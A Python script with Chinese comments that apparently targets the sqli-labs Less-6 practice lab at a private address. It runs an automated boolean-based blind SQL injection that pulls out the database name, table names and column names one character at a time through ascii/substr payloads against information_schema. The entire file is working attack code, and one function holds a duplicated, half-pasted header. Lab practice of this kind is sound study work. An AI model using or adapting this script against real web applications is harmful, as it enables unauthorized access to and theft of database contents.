import requests

conn = requests.Session()
# 正确的URL格式 + 使用 f-string 替换 payload
base_url = "http://172.17.0.2/Less-6/?id=1\" and {payload} --+"
# 判断成功关键字
success_flag = "You are in"
star_char = 32
end_char = 126
# GET请求
def send_payload(payload):
    # 发送请求
    url = base_url.format(payload=payload)
    try:
       r = conn.get(url,timeout=5)
       if success_flag in r.text:
        #    print(f"successful:{payload}")
           return True
       else:
            # print(f"failed:{payload}")
            return False
    except Exception as e:
        print(f"timeout:{e}")
        exit()


         

#获取数据库的名称
def GetDBName():
    DBName = ''
    #获取数据库的字节长度
    print('Getting length')
    length = 0
    for l in range(1,99):
        payload  = f"length((select database())) = {l}"
        res = send_payload(payload)
        if res == True:
            length = l
            print("数据的长度为:",str(length))
            break
    #获取数据库的名字    
    print("Getting DBname")
    for  i in range(1,length+1):
        for j in range(star_char,end_char+1):
            payload = f"ascii(substr((select database()),{i},1)) = {j}"
            res = send_payload(payload)
            if res == True:
               DBName += chr(j)
               print(f"目前数据库为:{DBName}")
               break
    print("数据库名字为",DBName)
    return(DBName)
        
#Here is getting the sql_table
def GetTBname():
    print("正在获取表")
    
    table_count = 0
#The max char in sql is 255 char but you can change to 50 or the other nums
    for i in range (1,50):
        
        payload = f"(select count(*) from information_schema.tables where table_schema=database()) = {i}"
        res = send_payload(payload)
        if res == True:
            print(f"表格的数量为 {i}")
            table_count = i
            break
    
    for index in range(0, table_count):
        print(f"\n正在获取表 #{index + 1}")

        tb_length = 0
        for l in range(1, 50):
            payload = f"length((select table_name from information_schema.tables where table_schema=database() limit {index},1)) = {l}"
            res = send_payload(payload)
            if res:
                tb_length = l
                print(f"表格长度为: {tb_length}")
                break

        # 爆破表名字符
        tb_name = ''
        for pos in range(1, tb_length + 1):
            for ch in range(32, 127):  # 可打印字符范围
                payload = f"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {index},1), {pos}, 1)) = {ch}"
                res = send_payload(payload)
                if res:
                    tb_name += chr(ch)
                    print(f" 目前字段名: {tb_name}")
                    break

        print(f" Table #{index + 1} 名为: {tb_name}")
def GetColumnNames(table_name):
    print(f"\n正在获取{table_name}的字段")
    col_count=0
    
    #正在def GetColumnNames(table_name):
    print(f"\n 正在获取 `{table_name}` 的字段名")
    col_count = 0

    # 获取字段数量
    for i in range(1, 50):
        payload = f"(select count(*) from information_schema.columns where table_name='{table_name}') = {i}"
        res = send_payload(payload)
        if res:
            col_count = i
            print(f" 字段数量为：{col_count}")
            break

    #  遍历每个字段
    for index in range(0, col_count):
        print(f"\n 正在获取第 {index + 1} 个字段名")

        # 1. 获取字段名长度
        col_length = 0
        for l in range(1, 50):
            payload = f"length((select column_name from information_schema.columns where table_name='{table_name}' limit {index},1)) = {l}"
            res = send_payload(payload)
            if res:
                col_length = l
                print(f" 字段名长度：{col_length}")
                break

        # 2. 获取字段名的每个字符
        col_name = ''
        for pos in range(1, col_length + 1):
            for ch in range(32, 127):
                payload = f"ascii(substr((select column_name from information_schema.columns where table_name='{table_name}' limit {index},1), {pos}, 1)) = {ch}"
                res = send_payload(payload)
                if res:
                    col_name += chr(ch)
                    print(f" 当前字段名：{col_name}")
                    break

        print(f"✅ 第 {index + 1} 个字段名为：{col_name}")

    
     
if __name__ == "__main__":
    GetDBName()
    GetTBname() 
    target_table = input("\n请输入要爆破字段的表名: ").strip()
    GetColumnNames(target_table)